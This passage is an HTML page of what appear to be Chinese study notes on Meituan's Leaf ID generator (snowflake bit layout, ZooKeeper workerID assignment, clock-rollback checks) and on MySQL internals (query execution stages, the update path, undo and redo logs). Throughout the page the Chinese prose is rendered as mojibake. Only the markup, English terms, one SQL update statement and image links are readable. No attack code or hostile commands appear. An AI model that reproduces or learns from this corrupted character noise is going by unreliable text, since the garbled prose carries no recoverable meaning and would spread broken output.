<p>åŒæ—¶LeafæœåŠ¡åˆ†IDCéƒ¨ç½²ï¼Œå†…éƒ¨çš„æœåŠ¡åŒ–æ¡†æ¶æ˜¯â€œMTthrift RPCâ€ã€‚æœåŠ¡è°ƒç”¨çš„æ—¶å€™ï¼Œæ ¹æ®è´Ÿè½½å‡è¡¡ç®—æ³•ä¼šä¼˜å…ˆè°ƒç”¨åŒæœºæˆ¿çš„LeafæœåŠ¡ã€‚åœ¨è¯¥IDCå†…LeafæœåŠ¡ä¸å¯ç”¨çš„æ—¶å€™æ‰ä¼šé€‰æ‹©å…¶ä»–æœºæˆ¿çš„LeafæœåŠ¡ã€‚åŒæ—¶æœåŠ¡æ²»ç†å¹³å°OCTOè¿˜æä¾›äº†é’ˆå¯¹æœåŠ¡çš„è¿‡è½½ä¿æŠ¤ã€ä¸€é”®æˆªæµã€åŠ¨æ€æµé‡åˆ†é…ç­‰å¯¹æœåŠ¡çš„ä¿æŠ¤æªæ–½ã€‚</p>
<h4 id="Leaf-snowflakeæ–¹æ¡ˆ"><a href="#Leaf-snowflakeæ–¹æ¡ˆ" class="headerlink" title="Leaf-snowflakeæ–¹æ¡ˆ"></a>Leaf-snowflakeæ–¹æ¡ˆ</h4><p>Leaf-segmentæ–¹æ¡ˆå¯ä»¥ç”Ÿæˆè¶‹åŠ¿é€’å¢çš„IDï¼ŒåŒæ—¶IDå·æ˜¯å¯è®¡ç®—çš„ï¼Œä¸é€‚ç”¨äºè®¢å•IDç”Ÿæˆåœºæ™¯ï¼Œæ¯”å¦‚ç«å¯¹åœ¨ä¸¤å¤©ä¸­åˆ12ç‚¹åˆ†åˆ«ä¸‹å•ï¼Œé€šè¿‡è®¢å•idå·ç›¸å‡å°±èƒ½å¤§è‡´è®¡ç®—å‡ºå…¬å¸ä¸€å¤©çš„è®¢å•é‡ï¼Œè¿™ä¸ªæ˜¯ä¸èƒ½å¿å—çš„ã€‚ Leaf-snowflakeæ–¹æ¡ˆå¯ä»¥å¾ˆå¥½çš„è§£å†³è¿™ä¸ªé—®é¢˜ã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202262023049.png" alt="img"></p>
<p>Leaf-snowflakeæ–¹æ¡ˆå®Œå…¨æ²¿ç”¨snowflakeæ–¹æ¡ˆçš„bitä½è®¾è®¡ï¼Œå³æ˜¯â€œ1+41+10+12â€çš„æ–¹å¼ç»„è£…IDå·ã€‚å¯¹äºworkerIDçš„åˆ†é…ï¼Œå½“æœåŠ¡é›†ç¾¤æ•°é‡è¾ƒå°çš„æƒ…å†µä¸‹ï¼Œå®Œå…¨å¯ä»¥æ‰‹åŠ¨é…ç½®ã€‚LeafæœåŠ¡è§„æ¨¡è¾ƒå¤§ï¼ŒåŠ¨æ‰‹é…ç½®æˆæœ¬å¤ªé«˜ã€‚æ‰€ä»¥ä½¿ç”¨ZookeeperæŒä¹…é¡ºåºèŠ‚ç‚¹çš„ç‰¹æ€§è‡ªåŠ¨å¯¹snowflakeèŠ‚ç‚¹é…ç½®wokerIDã€‚Leaf-snowflakeæ˜¯æŒ‰ç…§ä¸‹é¢å‡ ä¸ªæ­¥éª¤å¯åŠ¨çš„ï¼š</p>
<ol>
<li>å¯åŠ¨Leaf-snowflakeæœåŠ¡ï¼Œè¿æ¥Zookeeperï¼Œåœ¨leaf_foreverçˆ¶èŠ‚ç‚¹ä¸‹æ£€æŸ¥è‡ªå·±æ˜¯å¦å·²ç»æ³¨å†Œè¿‡ï¼ˆæ˜¯å¦æœ‰è¯¥é¡ºåºå­èŠ‚ç‚¹ï¼‰ã€‚</li>
<li>å¦‚æœæœ‰æ³¨å†Œè¿‡ç›´æ¥å–å›è‡ªå·±çš„workerIDï¼ˆzké¡ºåºèŠ‚ç‚¹ç”Ÿæˆçš„intç±»å‹IDå·ï¼‰ï¼Œå¯åŠ¨æœåŠ¡ã€‚</li>
<li>å¦‚æœæ²¡æœ‰æ³¨å†Œè¿‡ï¼Œå°±åœ¨è¯¥çˆ¶èŠ‚ç‚¹ä¸‹é¢åˆ›å»ºä¸€ä¸ªæŒä¹…é¡ºåºèŠ‚ç‚¹ï¼Œåˆ›å»ºæˆåŠŸåå–å›é¡ºåºå·å½“åšè‡ªå·±çš„workerIDå·ï¼Œå¯åŠ¨æœåŠ¡ã€‚</li>
</ol>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202262024027.png" alt="image"></p>
<h5 id="å¼±ä¾èµ–ZooKeeper"><a href="#å¼±ä¾èµ–ZooKeeper" class="headerlink" title="å¼±ä¾èµ–ZooKeeper"></a>å¼±ä¾èµ–ZooKeeper</h5><p>é™¤äº†æ¯æ¬¡ä¼šå»ZKæ‹¿æ•°æ®ä»¥å¤–ï¼Œä¹Ÿä¼šåœ¨æœ¬æœºæ–‡ä»¶ç³»ç»Ÿä¸Šç¼“å­˜ä¸€ä¸ªworkerIDæ–‡ä»¶ã€‚å½“ZooKeeperå‡ºç°é—®é¢˜ï¼Œæ°å¥½æœºå™¨å‡ºç°é—®é¢˜éœ€è¦é‡å¯æ—¶ï¼Œèƒ½ä¿è¯æœåŠ¡èƒ½å¤Ÿæ­£å¸¸å¯åŠ¨ã€‚è¿™æ ·åšåˆ°äº†å¯¹ä¸‰æ–¹ç»„ä»¶çš„å¼±ä¾èµ–ã€‚ä¸€å®šç¨‹åº¦ä¸Šæé«˜äº†SLAã€‚</p>
<h5 id="è§£å†³æ—¶é’Ÿé—®é¢˜"><a href="#è§£å†³æ—¶é’Ÿé—®é¢˜" class="headerlink" title="è§£å†³æ—¶é’Ÿé—®é¢˜"></a>è§£å†³æ—¶é’Ÿé—®é¢˜</h5><p>å› ä¸ºè¿™ç§æ–¹æ¡ˆä¾èµ–æ—¶é—´ï¼Œå¦‚æœæœºå™¨çš„æ—¶é’Ÿå‘ç”Ÿäº†å›æ‹¨ï¼Œé‚£ä¹ˆå°±ä¼šæœ‰å¯èƒ½ç”Ÿæˆé‡å¤çš„IDå·ï¼Œéœ€è¦è§£å†³æ—¶é’Ÿå›é€€çš„é—®é¢˜ã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202262024180.png" alt="image"></p>
<p>æœåŠ¡å¯åŠ¨æ—¶é¦–å…ˆæ£€æŸ¥è‡ªå·±æ˜¯å¦å†™è¿‡ZooKeeper leaf_foreverèŠ‚ç‚¹ï¼š</p>
<ol>
<li>è‹¥å†™è¿‡ï¼Œåˆ™ç”¨è‡ªèº«ç³»ç»Ÿæ—¶é—´ä¸leaf_forever&#x2F;${self}èŠ‚ç‚¹è®°å½•æ—¶é—´åšæ¯”è¾ƒï¼Œè‹¥å°äºleaf_forever&#x2F;${self}æ—¶é—´åˆ™è®¤ä¸ºæœºå™¨æ—¶é—´å‘ç”Ÿäº†å¤§æ­¥é•¿å›æ‹¨ï¼ŒæœåŠ¡å¯åŠ¨å¤±è´¥å¹¶æŠ¥è­¦ã€‚</li>
<li>è‹¥æœªå†™è¿‡ï¼Œè¯æ˜æ˜¯æ–°æœåŠ¡èŠ‚ç‚¹ï¼Œç›´æ¥åˆ›å»ºæŒä¹…èŠ‚ç‚¹leaf_forever&#x2F;${self}å¹¶å†™å…¥è‡ªèº«ç³»ç»Ÿæ—¶é—´ï¼Œæ¥ä¸‹æ¥ç»¼åˆå¯¹æ¯”å…¶ä½™LeafèŠ‚ç‚¹çš„ç³»ç»Ÿæ—¶é—´æ¥åˆ¤æ–­è‡ªèº«ç³»ç»Ÿæ—¶é—´æ˜¯å¦å‡†ç¡®ï¼Œå…·ä½“åšæ³•æ˜¯å–leaf_temporaryä¸‹çš„æ‰€æœ‰ä¸´æ—¶èŠ‚ç‚¹ï¼ˆæ‰€æœ‰è¿è¡Œä¸­çš„Leaf-snowflakeèŠ‚ç‚¹ï¼‰çš„æœåŠ¡IPï¼šPortï¼Œç„¶åé€šè¿‡RPCè¯·æ±‚å¾—åˆ°æ‰€æœ‰èŠ‚ç‚¹çš„ç³»ç»Ÿæ—¶é—´ï¼Œè®¡ç®—sum(time)&#x2F;nodeSizeã€‚</li>
<li>è‹¥abs( ç³»ç»Ÿæ—¶é—´-sum(time)&#x2F;nodeSize ) &lt; é˜ˆå€¼ï¼Œè®¤ä¸ºå½“å‰ç³»ç»Ÿæ—¶é—´å‡†ç¡®ï¼Œæ­£å¸¸å¯åŠ¨æœåŠ¡ï¼ŒåŒæ—¶å†™ä¸´æ—¶èŠ‚ç‚¹leaf_temporary&#x2F;${self} ç»´æŒç§Ÿçº¦ã€‚</li>
<li>å¦åˆ™è®¤ä¸ºæœ¬æœºç³»ç»Ÿæ—¶é—´å‘ç”Ÿå¤§æ­¥é•¿åç§»ï¼Œå¯åŠ¨å¤±è´¥å¹¶æŠ¥è­¦ã€‚</li>
<li>æ¯éš”ä¸€æ®µæ—¶é—´(3s)ä¸ŠæŠ¥è‡ªèº«ç³»ç»Ÿæ—¶é—´å†™å…¥leaf_forever&#x2F;${self}ã€‚</li>
</ol>
<p>ç”±äºå¼ºä¾èµ–æ—¶é’Ÿï¼Œå¯¹æ—¶é—´çš„è¦æ±‚æ¯”è¾ƒæ•æ„Ÿï¼Œåœ¨æœºå™¨å·¥ä½œæ—¶NTPåŒæ­¥ä¹Ÿä¼šé€ æˆç§’çº§åˆ«çš„å›é€€ï¼Œå»ºè®®å¯ä»¥ç›´æ¥å…³é—­NTPåŒæ­¥ã€‚è¦ä¹ˆåœ¨æ—¶é’Ÿå›æ‹¨çš„æ—¶å€™ç›´æ¥ä¸æä¾›æœåŠ¡ç›´æ¥è¿”å›ERROR_CODEï¼Œç­‰æ—¶é’Ÿè¿½ä¸Šå³å¯ã€‚<strong>æˆ–è€…åšä¸€å±‚é‡è¯•ï¼Œç„¶åä¸ŠæŠ¥æŠ¥è­¦ç³»ç»Ÿï¼Œæ›´æˆ–è€…æ˜¯å‘ç°æœ‰æ—¶é’Ÿå›æ‹¨ä¹‹åè‡ªåŠ¨æ‘˜é™¤æœ¬èº«èŠ‚ç‚¹å¹¶æŠ¥è­¦</strong>ã€‚</p>
<p><strong>ä»ä¸Šçº¿æƒ…å†µæ¥çœ‹ï¼Œåœ¨2017å¹´é—°ç§’å‡ºç°é‚£ä¸€æ¬¡å‡ºç°è¿‡éƒ¨åˆ†æœºå™¨å›æ‹¨ï¼Œç”±äºLeaf-snowflakeçš„ç­–ç•¥ä¿è¯ï¼ŒæˆåŠŸé¿å…äº†å¯¹ä¸šåŠ¡é€ æˆçš„å½±å“ã€‚</strong></p>
<h4 id="Leafç°çŠ¶"><a href="#Leafç°çŠ¶" class="headerlink" title="Leafç°çŠ¶"></a>Leafç°çŠ¶</h4><p>Leafåœ¨ç¾å›¢ç‚¹è¯„å…¬å¸å†…éƒ¨æœåŠ¡åŒ…å«é‡‘èã€æ”¯ä»˜äº¤æ˜“ã€é¤é¥®ã€å¤–å–ã€é…’åº—æ—…æ¸¸ã€çŒ«çœ¼ç”µå½±ç­‰ä¼—å¤šä¸šåŠ¡çº¿ã€‚ç›®å‰Leafçš„æ€§èƒ½åœ¨4C8Gçš„æœºå™¨ä¸ŠQPSèƒ½å‹æµ‹åˆ°è¿‘5w&#x2F;sï¼ŒTP999 1msï¼Œå·²ç»èƒ½å¤Ÿæ»¡è¶³å¤§éƒ¨åˆ†çš„ä¸šåŠ¡çš„éœ€æ±‚ã€‚æ¯å¤©æä¾›äº¿æ•°é‡çº§çš„è°ƒç”¨é‡ï¼Œä½œä¸ºå…¬å¸å†…éƒ¨å…¬å…±çš„åŸºç¡€æŠ€æœ¯è®¾æ–½ï¼Œå¿…é¡»ä¿è¯é«˜SLAå’Œé«˜æ€§èƒ½çš„æœåŠ¡.</p>
<h2 id="ä¸€æ¡SQLè¯­å¥åœ¨MySQLä¸­å¦‚ä½•æ‰§è¡Œçš„"><a href="#ä¸€æ¡SQLè¯­å¥åœ¨MySQLä¸­å¦‚ä½•æ‰§è¡Œçš„" class="headerlink" title="ä¸€æ¡SQLè¯­å¥åœ¨MySQLä¸­å¦‚ä½•æ‰§è¡Œçš„"></a>ä¸€æ¡SQLè¯­å¥åœ¨MySQLä¸­å¦‚ä½•æ‰§è¡Œçš„</h2><ul>
<li><p>serverå±‚ï¼šè¿æ¥ï¼ŒæŸ¥è¯¢ç¼“å­˜ï¼Œåˆ†æï¼Œä¼˜åŒ–ï¼Œæ‰§è¡Œ</p>
<ul>
<li><p>è¿æ¥å™¨ï¼šç™»å½•æ•°æ®åº“ï¼Œåˆ†ææƒé™ï¼Œå»ºç«‹è¿æ¥ï¼Œåœ¨è¿æ¥ä¸æ–­å¼€çš„æƒ…å†µä¸‹ï¼Œå³ä½¿ç®¡ç†å‘˜ä¿®æ”¹è¿™ä¸ªç”¨æˆ·çš„æƒé™ä¹Ÿä¸ä¼šç”Ÿæ•ˆã€‚</p>
</li>
<li><p>æŸ¥è¯¢ç¼“å­˜ï¼ˆmysql8.0 ç‰ˆæœ¬åç§»é™¤ï¼‰ï¼š æŸ¥è¯¢ç¼“å­˜ä¸»è¦ç”¨æ¥ç¼“å­˜æˆ‘ä»¬æ‰€æ‰§è¡Œçš„ SELECT è¯­å¥ä»¥åŠè¯¥è¯­å¥çš„ç»“æœé›†ã€‚</p>
<p>è¿æ¥å»ºç«‹åï¼Œæ‰§è¡ŒæŸ¥è¯¢è¯­å¥çš„æ—¶å€™ï¼Œä¼šå…ˆæŸ¥è¯¢ç¼“å­˜ï¼ŒMySQL ä¼šå…ˆæ ¡éªŒè¿™ä¸ª sql æ˜¯å¦æ‰§è¡Œè¿‡ï¼Œä»¥ Key-Value çš„å½¢å¼ç¼“å­˜åœ¨å†…å­˜ä¸­ï¼ŒKey æ˜¯æŸ¥è¯¢è¯­å¥ï¼ŒValue æ˜¯ç»“æœé›†ã€‚å¦‚æœç¼“å­˜ key è¢«å‘½ä¸­ï¼Œå°±ä¼šç›´æ¥è¿”å›ç»™å®¢æˆ·ç«¯ï¼Œå¦‚æœæ²¡æœ‰å‘½ä¸­ï¼Œå°±ä¼šæ‰§è¡Œåç»­çš„æ“ä½œï¼Œå®Œæˆåä¹Ÿä¼šæŠŠç»“æœç¼“å­˜èµ·æ¥ï¼Œæ–¹ä¾¿ä¸‹ä¸€æ¬¡è°ƒç”¨ã€‚å½“ç„¶åœ¨çœŸæ­£æ‰§è¡Œç¼“å­˜æŸ¥è¯¢çš„æ—¶å€™è¿˜æ˜¯ä¼šæ ¡éªŒç”¨æˆ·çš„æƒé™ï¼Œæ˜¯å¦æœ‰è¯¥è¡¨çš„æŸ¥è¯¢æ¡ä»¶ã€‚</p>
<p>MySQL æŸ¥è¯¢ä¸å»ºè®®ä½¿ç”¨ç¼“å­˜ï¼Œå› ä¸ºæŸ¥è¯¢ç¼“å­˜å¤±æ•ˆåœ¨å®é™…ä¸šåŠ¡åœºæ™¯ä¸­å¯èƒ½ä¼šéå¸¸é¢‘ç¹ï¼Œå‡å¦‚ä½ å¯¹ä¸€ä¸ªè¡¨æ›´æ–°çš„è¯ï¼Œè¿™ä¸ªè¡¨ä¸Šçš„æ‰€æœ‰çš„æŸ¥è¯¢ç¼“å­˜éƒ½ä¼šè¢«æ¸…ç©ºã€‚å¯¹äºä¸ç»å¸¸æ›´æ–°çš„æ•°æ®æ¥è¯´ï¼Œä½¿ç”¨ç¼“å­˜è¿˜æ˜¯å¯ä»¥çš„ã€‚</p>
<p>æ‰€ä»¥ï¼Œä¸€èˆ¬åœ¨å¤§å¤šæ•°æƒ…å†µä¸‹éƒ½æ˜¯ä¸æ¨èå»ä½¿ç”¨æŸ¥è¯¢ç¼“å­˜çš„ã€‚</p>
<p>MySQL 8.0 ç‰ˆæœ¬ååˆ é™¤äº†ç¼“å­˜çš„åŠŸèƒ½ï¼Œå®˜æ–¹ä¹Ÿæ˜¯è®¤ä¸ºè¯¥åŠŸèƒ½åœ¨å®é™…çš„åº”ç”¨åœºæ™¯æ¯”è¾ƒå°‘ï¼Œæ‰€ä»¥å¹²è„†ç›´æ¥åˆ æ‰äº†ã€‚</p>
</li>
<li><p>åˆ†æå™¨ï¼š</p>
<ul>
<li><p>è¯æ³•åˆ†æï¼šä¸€æ¡ SQL è¯­å¥æœ‰å¤šä¸ªå­—ç¬¦ä¸²ç»„æˆï¼Œé¦–å…ˆè¦æå–å…³é”®å­—ï¼Œæ¯”å¦‚ selectï¼Œæå‡ºæŸ¥è¯¢çš„è¡¨ï¼Œæå‡ºå­—æ®µåï¼Œæå‡ºæŸ¥è¯¢æ¡ä»¶ç­‰ç­‰ã€‚åšå®Œè¿™äº›æ“ä½œåï¼Œå°±ä¼šè¿›å…¥ç¬¬äºŒæ­¥ã€‚</p>
</li>
<li><p>è¯­æ³•åˆ†æï¼šä¸»è¦å°±æ˜¯åˆ¤æ–­ä½ è¾“å…¥çš„ sql æ˜¯å¦æ­£ç¡®ï¼Œæ˜¯å¦ç¬¦åˆ MySQL çš„è¯­æ³•ã€‚</p>
</li>
</ul>
</li>
<li><p>ä¼˜åŒ–å™¨ï¼šä¼˜åŒ–å™¨çš„ä½œç”¨å°±æ˜¯å·²å®ƒè®¤ä¸ºçš„æœ€ä¼˜çš„æ‰§è¡Œæ–¹æ¡ˆå»æ‰§è¡Œï¼ˆæœ‰æ—¶å€™å¯èƒ½ä¹Ÿä¸æ˜¯æœ€ä¼˜ï¼‰ï¼Œæ¯”å¦‚å¤šä¸ªç´¢å¼•çš„æ—¶å€™è¯¥å¦‚ä½•é€‰æ‹©ç´¢å¼•ï¼Œå¤šè¡¨æŸ¥è¯¢çš„æ—¶å€™å¦‚ä½•é€‰æ‹©å…³è”é¡ºåºç­‰ã€‚</p>
<p>å¯ä»¥è¯´ï¼Œç»è¿‡äº†ä¼˜åŒ–å™¨ä¹‹åå¯ä»¥è¯´è¿™ä¸ªè¯­å¥å…·ä½“è¯¥å¦‚ä½•æ‰§è¡Œå°±å·²ç»å®šä¸‹æ¥ã€‚</p>
</li>
<li><p>æ‰§è¡Œå™¨ï¼šå½“é€‰æ‹©äº†æ‰§è¡Œæ–¹æ¡ˆå,mysqlå°±å‡†å¤‡å¼€å§‹æ‰§è¡Œäº†,é¦–å…ˆæ‰§è¡Œå‰ä¼šæ£€éªŒè¯¥ç”¨æˆ·æœ‰æ²¡æœ‰æƒé™,å¦‚æœæ²¡æœ‰æƒé™,å°±ä¼šè¿”å›é”™è¯¯ä¿¡æ¯,å¦‚æœæœ‰æƒé™,å°±ä¼šå»è°ƒç”¨å¼•æ“çš„æ¥å£,è¿”å›æ¥å£æ‰§è¡Œçš„ç»“æœ</p>
</li>
</ul>
</li>
<li><p>å­˜å‚¨å¼•æ“ï¼šä¸»è¦è´Ÿè´£æ•°æ®çš„å­˜å‚¨å’Œè¯»å–ï¼Œé‡‡ç”¨å¯ä»¥æ›¿æ¢çš„æ’ä»¶å¼æ¶æ„ï¼Œæ”¯æŒ InnoDBã€MyISAMã€Memory ç­‰å¤šä¸ªå­˜å‚¨å¼•æ“ï¼Œå…¶ä¸­ InnoDB å¼•æ“æœ‰è‡ªæœ‰çš„æ—¥å¿—æ¨¡å— redolog æ¨¡å—ã€‚<strong>ç°åœ¨æœ€å¸¸ç”¨çš„å­˜å‚¨å¼•æ“æ˜¯ InnoDBï¼Œå®ƒä» MySQL 5.5.5 ç‰ˆæœ¬å¼€å§‹å°±è¢«å½“åšé»˜è®¤å­˜å‚¨å¼•æ“äº†ã€‚</strong></p>
</li>
</ul>
<p>MySQL ä¸»è¦åˆ†ä¸º Server å±‚å’Œå¼•æ“å±‚ï¼ŒServer å±‚ä¸»è¦åŒ…æ‹¬è¿æ¥å™¨ã€æŸ¥è¯¢ç¼“å­˜ã€åˆ†æå™¨ã€ä¼˜åŒ–å™¨ã€æ‰§è¡Œå™¨ï¼ŒåŒæ—¶è¿˜æœ‰ä¸€ä¸ªæ—¥å¿—æ¨¡å—ï¼ˆbinlogï¼‰ï¼Œè¿™ä¸ªæ—¥å¿—æ¨¡å—æ‰€æœ‰æ‰§è¡Œå¼•æ“éƒ½å¯ä»¥å…±ç”¨ï¼Œredolog åªæœ‰ InnoDB æœ‰ã€‚</p>
<p><img src="https://typora-mingwhuang.oss-cn-shenzhen.aliyuncs.com/typora/202202151438635.png" alt="img"></p>
<h3 id="ä¸€æ¡æ›´æ–°è¯­å¥æ‰§è¡Œçš„é¡ºåº"><a href="#ä¸€æ¡æ›´æ–°è¯­å¥æ‰§è¡Œçš„é¡ºåº" class="headerlink" title="ä¸€æ¡æ›´æ–°è¯­å¥æ‰§è¡Œçš„é¡ºåº"></a>ä¸€æ¡æ›´æ–°è¯­å¥æ‰§è¡Œçš„é¡ºåº</h3><p>update T set c&#x3D;c+1 where ID&#x3D;2;</p>
<ul>
<li>æ‰§è¡Œå™¨å…ˆæ‰¾å¼•æ“å– ID&#x3D;2 è¿™ä¸€è¡Œã€‚ID æ˜¯ä¸»é”®ï¼Œå¼•æ“ç›´æ¥ç”¨æ ‘æœç´¢æ‰¾åˆ°è¿™ä¸€è¡Œã€‚å¦‚æœ ID&#x3D;2 è¿™ä¸€è¡Œæ‰€åœ¨çš„æ•°æ®é¡µæœ¬æ¥å°±åœ¨å†…å­˜ä¸­ï¼Œå°±ç›´æ¥è¿”å›ç»™æ‰§è¡Œå™¨ï¼›å¦åˆ™ï¼Œéœ€è¦å…ˆä»ç£ç›˜è¯»å…¥å†…å­˜ï¼Œç„¶åå†è¿”å›ã€‚å¦‚æœå†…å­˜ä¸è¶³ï¼Œåˆ™éœ€è¦é¡µé¢ç½®æ¢ï¼ˆæœ€ä½³ç½®æ¢ã€å…ˆè¿›å…ˆå‡ºã€æœ€è¿‘æœ€è¿‘æœªç”¨ã€æ—¶é’Ÿç½®æ¢ç®—æ³•ï¼ˆåªæœ‰ä¸€ä¸ªè®¿é—®ä½ï¼‰ã€æ”¹è¿›å‹æ—¶é’Ÿç½®æ¢ç®—æ³•ï¼ˆæœ‰ä¸€ä¸ªè®¿é—®å’Œä¿®æ”¹ä½ï¼Œä¼˜å…ˆæ·˜æ±°æ²¡æœ‰ä¿®æ”¹è¿‡çš„é¡µé¢ï¼‰ ï¼‰ã€‚</li>
<li>æ‰§è¡Œå™¨æ‹¿åˆ°å¼•æ“ç»™çš„è¡Œæ•°æ®ï¼ŒæŠŠè¿™ä¸ªå€¼åŠ ä¸Š 1ï¼Œæ¯”å¦‚åŸæ¥æ˜¯ Nï¼Œç°åœ¨å°±æ˜¯ N+1ï¼Œå¾—åˆ°æ–°çš„ä¸€è¡Œæ•°æ®ï¼Œå†è°ƒç”¨å¼•æ“æ¥å£å†™å…¥è¿™è¡Œæ–°æ•°æ®ã€‚</li>
<li>å¼•æ“å°†è¿™è¡Œæ–°æ•°æ®æ›´æ–°åˆ°å†…å­˜ä¸­ï¼ŒåŒæ—¶å°†è¿™ä¸ªæ›´æ–°æ“ä½œè®°å½•åˆ° redo log é‡Œé¢ï¼Œæ­¤æ—¶ redo log å¤„äº prepare çŠ¶æ€ã€‚ç„¶åå‘ŠçŸ¥æ‰§è¡Œå™¨æ‰§è¡Œå®Œæˆäº†ï¼Œéšæ—¶å¯ä»¥æäº¤äº‹åŠ¡ã€‚</li>
<li>æ‰§è¡Œå™¨ç”Ÿæˆè¿™ä¸ªæ“ä½œçš„binlogï¼Œå¹¶æŠŠ binlog å†™å…¥ç£ç›˜ï¼ˆFIFSã€ æœ€çŸ­å¯»é“æ—¶é—´ã€æ‰«æç®—æ³•å’Œå¾ªç¯æ‰«æç®—æ³•ï¼‰ã€‚</li>
<li>æ‰§è¡Œå™¨è°ƒç”¨å¼•æ“çš„æäº¤äº‹åŠ¡æ¥å£ï¼Œå¼•æ“æŠŠåˆšåˆšå†™å…¥çš„ redo log æ”¹æˆæäº¤ï¼ˆcommitï¼‰çŠ¶æ€ï¼Œæ›´æ–°å®Œæˆã€‚</li>
</ul>
<h2 id="Undo-logã€-Redo-logã€Binary-log"><a href="#Undo-logã€-Redo-logã€Binary-log" class="headerlink" title="Undo logã€ Redo logã€Binary log"></a>Undo logã€ Redo logã€Binary log</h2><h3 id="undo-logå’Œredo-log"><a href="#undo-logå’Œredo-log" class="headerlink" title="undo logå’Œredo log"></a>undo logå’Œredo log</h3><p>åœ¨æ•°æ®åº“ç³»ç»Ÿä¸­ï¼Œæ—¢æœ‰å­˜æ”¾æ•°æ®çš„æ–‡ä»¶ï¼Œä¹Ÿæœ‰å­˜æ”¾æ—¥å¿—çš„æ–‡ä»¶ã€‚æ—¥å¿—åœ¨å†…å­˜ä¸­ä¹Ÿæ˜¯æœ‰ç¼“å­˜Log bufferï¼Œä¹Ÿæœ‰ç£ç›˜æ–‡ä»¶log fileã€‚MySQLä¸­çš„æ—¥å¿—æ–‡ä»¶ï¼Œæœ‰è¿™ä¹ˆä¸¤ç±»ä¸äº‹åŠ¡æœ‰å…³ï¼šundoæ—¥å¿—ä¸redoæ—¥å¿—ã€‚</p>
<h4 id="undo-log"><a href="#undo-log" class="headerlink" title="undo log"></a>undo log</h4><p>æŒä¹…æ€§å’ŒåŸå­æ€§å¯ä»¥åˆ©ç”¨undo logæ¥å®ç°ã€‚</p>
<p>åŸç†ï¼šä¸ºäº†æ»¡è¶³äº‹åŠ¡çš„åŸå­æ€§ï¼Œåœ¨æ“ä½œä»»ä½•æ•°æ®ä¹‹å‰ï¼Œé¦–å…ˆå°†æ•°æ®å¤‡ä»½åˆ°undo logï¼Œç„¶åè¿›è¡Œæ•°æ®çš„ä¿®æ”¹ã€‚å¦‚æœå‡ºç°äº†é”™è¯¯æˆ–è€…ç”¨æˆ·æ‰§è¡Œäº†ROLLBACKè¯­å¥ï¼Œç³»ç»Ÿå¯ä»¥åˆ©ç”¨Undo log ä¸­çš„å¤‡ä»½æ•°æ®å°†æ•°æ®æ¢å¤åˆ°äº‹åŠ¡å¼€å§‹ä¹‹å‰çš„çŠ¶æ€ã€‚</p>
<p>æ•°æ®åº“å†™å…¥æ•°æ®åˆ°ç£ç›˜ä¹‹å‰ä¼šæŠŠæ•°æ®å…ˆç¼“å­˜åœ¨å†…å­˜ä¸­ï¼Œäº‹åŠ¡æäº¤æ—¶æ‰ä¼šå†™å…¥ç£ç›˜ä¸­ã€‚</p>
<p>ç”¨undo log å®ç°åŸå­æ€§å’ŒæŒä¹…æ€§çš„äº‹åŠ¡çš„ç®€åŒ–è¿‡ç¨‹: </p>
<p>å‡è®¾æœ‰Aã€Bä¸¤ä¸ªæ•°æ®ï¼Œå€¼åˆ†åˆ«ä¸º1,2</p>
<p> A. äº‹åŠ¡å¼€å§‹.<br> B. è®°å½•A&#x3D;1åˆ°undo log buffer.<br> C. ä¿®æ”¹A&#x3D;3.<br> D. è®°å½•B&#x3D;2åˆ°undo log buffer.<br> E. ä¿®æ”¹B&#x3D;4.<br> F. å°†undo log bufferå†™åˆ°ç£ç›˜ã€‚<br> G. å°†æ•°æ®å†™åˆ°ç£ç›˜ã€‚<br> H. äº‹åŠ¡æäº¤</p>
<ul>
<li><p>å¦‚ä½•ä¿è¯åŸå­æ€§ï¼Ÿ</p>
<p>åœ¨ä¿®æ”¹æ•°æ®åˆ°ç£ç›˜å‰ï¼Œä¼šå…ˆè®°å½•undo logï¼Œå¹¶å°†undo logæŒä¹…åŒ–åˆ°ç¡¬ç›˜</p>
</li>
<li><p>å¦‚ä½•ä¿è¯æŒä¹…æ€§ï¼Ÿ</p>
<p>åœ¨äº‹åŠ¡æäº¤ä¹‹å‰ï¼ŒæŠŠå†…å­˜ä¸­ç¼“å­˜çš„æ•°æ®å†™å…¥ç£ç›˜ã€‚è¿™æ ·äº‹åŠ¡æäº¤æ—¶ï¼Œå¯ä»¥ç¡®å®šæ•°æ®æ˜¯å·²ç»æŒä¹…åŒ–çš„ï¼Œä¸ä¼šä¸¢å¤±ã€‚</p>
</li>
<li><p>è‹¥ç³»ç»Ÿåœ¨Gå’ŒHä¹‹é—´å´©æºƒ</p>
<p>æ­¤æ—¶äº‹åŠ¡å¹¶æœªæäº¤ï¼Œéœ€è¦å›æ»šã€‚è€Œundo logå·²ç»è¢«æŒä¹…åŒ–ï¼Œå¯ä»¥æ ¹æ®undo logæ¥æ¢å¤æ•°æ®</p>
</li>
<li><p>è‹¥ç³»ç»Ÿåœ¨Gä¹‹å‰å´©æºƒ</p>
<p>æ­¤æ—¶æ•°æ®å¹¶æœªæŒä¹…åŒ–åˆ°ç¡¬ç›˜ï¼Œä¾ç„¶ä¿æŒåœ¨äº‹åŠ¡ä¹‹å‰çš„çŠ¶æ€</p>
</li>
</ul>
<p><strong>ç¼ºé™·ï¼š</strong>æ¯ä¸ªäº‹åŠ¡æäº¤å‰å°†æ•°æ®å’ŒUndo Logå†™å…¥ç£ç›˜ï¼Œè¿™æ ·ä¼šå¯¼è‡´å¤§é‡çš„ç£ç›˜IOï¼Œå› æ­¤æ€§èƒ½å¾ˆä½ã€‚</p>
<p>å¦‚æœèƒ½å¤Ÿå°†æ•°æ®ç¼“å­˜ä¸€æ®µæ—¶é—´ï¼Œå°±èƒ½å‡å°‘IOæé«˜æ€§èƒ½ã€‚ä½†æ˜¯è¿™æ ·å°±ä¼šä¸§å¤±äº‹åŠ¡çš„æŒä¹…æ€§ã€‚å› æ­¤å¼•å…¥äº†å¦å¤–ä¸€ç§æœºåˆ¶æ¥å®ç°æŒä¹…åŒ–ï¼Œå³<strong>Redo Log</strong>.</p>
